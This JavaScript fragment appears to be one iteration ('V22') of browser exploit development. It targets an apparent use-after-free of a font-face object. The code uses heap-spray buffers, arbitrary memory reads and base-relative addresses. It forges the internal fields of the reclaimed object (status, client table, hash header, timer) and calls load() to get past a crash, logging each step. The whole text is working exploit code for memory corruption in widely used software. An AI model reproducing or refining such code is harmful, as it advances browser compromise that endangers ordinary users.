// V22 Patch: Original Timer Test
// V21 confirmed crash is INSIDE load() - test with ORIGINAL Timer (not zeroed/repaired)

/* ==== V22: ORIGINAL TIMER TEST ====
 *
 * V21 FINDING: Crash is INSIDE load(), not in pre-load validation.
 * V20 Arm C crashed even with Timer repair.
 *
 * HYPOTHESIS: The crash is caused by Timer MODIFICATION (zeroing or repairing),
 * not by the Timer itself. Test with ORIGINAL Timer from reclaimed face.
 *
 * APPROACH:
 * 1. Use ORIGINAL Timer from reclaimed face (no modification)
 * 2. Keep all other V18C crafting (empty sources, null clients, Pending status)
 * 3. Call load() and see if it crashes
 *
 * EXPECTED:
 * - If it works: Timer modification was the cause. Use original Timer.
 * - If it crashes: Timer itself is not the issue. Something else in transition.
 */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V22-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      /* Save pre-state for witness */
      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));

      /* ==== VALIDATE ORIGINAL TIMER ==== */
      bs('V22-VALIDATE-ORIGINAL-TIMER');

      /* Read the original Timer state from reclaimed face */
      var timerH=readAt(S+0x88n,0x38);
      bs('V22-ORIGINAL-TIMER='+timerH);

      /* Parse Timer fields */
      var timer90=timerH.substr(0,16);
      var timer98=timerH.substr(16,16);
      var timerA0=timerH.substr(32,16);
      var timerA8=timerH.substr(48,16);
      var timerB0=timerH.substr(64,16);
      var timerB8=timerH.substr(80,16);

      bs('V22-TIMER-90='+timer90);
      bs('V22-TIMER-98='+timer98);
      bs('V22-TIMER-A0='+timerA0);
      bs('V22-TIMER-A8='+timerA8);
      bs('V22-TIMER-B0='+timerB0);
      bs('V22-TIMER-B8='+timerB8);

      /* ==== CRAFT FACE (ORIGINAL TIMER, NO MODIFICATION) ==== */
      bs('V22-CRAFT-START');

      /* Status = Pending (0) */
      hitBuf[0x82]=0;
      bs('V22-FIELD-status=Pending');

      /* Override = Block (1) */
      hitBuf[0x87]=1;
      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
      bs('V22-FIELD-override=Block');

      /* Empty sources */
      for(var sz=0x28;sz<=0x37;sz++)hitBuf[sz]=0;
      bs('V22-FIELD-sources=empty');

      /* Null client table */
      for(var i=0;i<8;i++)hitBuf[0x58+i]=0;
      bs('V22-FIELD-clients=null');

      /* Hash table header */
      hitBuf[0x60]=3; hitBuf[0x61]=0; hitBuf[0x62]=0; hitBuf[0x63]=0;
      hitBuf[0x64]=0; hitBuf[0x65]=2; hitBuf[0x66]=0; hitBuf[0x67]=0;
      bs('V22-FIELD-htobj={3,0x200}');

      /* Promise null */
      for(var pb=0;pb<8;pb++)hitBuf[0x18+pb]=0;
      bs('V22-FIELD-promise=null');

      /* sourcesPopulated=1 */
      hitBuf[0x83]=1;
      bs('V22-FIELD-sourcesPopulated=1');

      /* TIMER: DO NOT MODIFY - keep original from reclaim */
      bs('V22-FIELD-timer=ORIGINAL-no-modification');

      bs('V22-CRAFT-COMPLETE');

      /* ==== VERIFY FINAL STATE ==== */
      bs('V22-VERIFY-FINAL');
      bs('V22-VERIFY-status='+hitBuf[0x82]);
      bs('V22-VERIFY-sources='+hitBuf.slice(0x28,0x38).map(x=>x.toString(16)).join(','));
      bs('V22-VERIFY-clients='+hitBuf.slice(0x58,0x60).map(x=>x.toString(16)).join(','));
      bs('V22-VERIFY-override='+hitBuf[0x87]);

      /* Verify Timer is still original */
      var timerAfterH=readAt(S+0x88n,0x38);
      if(timerAfterH===timerH){
        bs('V22-VERIFY-timer=UNCHANGED');
      }else{
        bs('V22-VERIFY-timer=CHANGED-unexpected');
      }

      /* ==== CALL LOAD ==== */
      bs('V22-LOAD-PRE');
      var loadReturned=false;
      var loadThrew=false;
      var loadError='';

      try{
        faces[zi].load();
        loadReturned=true;
        bs('V22-LOAD-RETURNED');
      }catch(e){
        loadThrew=true;
        loadError=String(e&&e.message?e.message:'?');
        bs('V22-LOAD-THREW-'+loadError);
      }

      /* ==== POST-LOAD ANALYSIS ==== */
      bs('V22-POST-LOAD-returned='+loadReturned+'-threw='+loadThrew);

      /* Final status read */
      var finalStatus=hitBuf[0x82];
      bs('V22-STATUS-AFTER='+finalStatus);

      /* Check JS binding status */
      try{
        var jsStatus=faces[zi].status;
        bs('V22-JS-STATUS='+jsStatus);
      }catch(e){
        bs('V22-JS-STATUS-ERROR-'+String(e&&e.message?e.message:'?'));
      }

      /* ==== WITNESS CHECK ==== */
      var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));
      var diffs=[];
      for(var wq=0;wq<0x100;wq+=8){
        var cur=0n,old=0n;
        for(var wb=0;wb<8;wb++){
          cur|=BigInt(curA[wq+wb])<<BigInt(wb*8);
          old|=BigInt(preA[wq+wb])<<BigInt(wb*8);
        }
        if(cur!==old)diffs.push('@'+(S+BigInt(wq)).toString(16)+':'+old.toString(16)+'>'+cur.toString(16));
      }
      if(diffs.length)bs('V22-WIT-WRITE-'+diffs.slice(0,8).join('|'));
      else bs('V22-WIT-nowrite');

      /* Restore original table pointer */
      for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
      bs('V22-RESTORED');

      /* Verdict */
      if(loadReturned){
        verd('ok','V22 Original Timer load() SUCCESS');
        bs('V22-DONE-SUCCESS-timer-modification-was-the-cause');
      }else{
        verd('err','V22 Original Timer load() FAILED');
        bs('V22-DONE-FAILED-timer-itself-is-the-issue');
      }

    }else bs('V22-SKIP-bad-idx');
  }else bs('V22-SKIP-missing-data');
}catch(e22){bs('V22-ERR-'+String(e22&&e22.message?e22.message:'?'));}
/* ==== V22 END ==== */
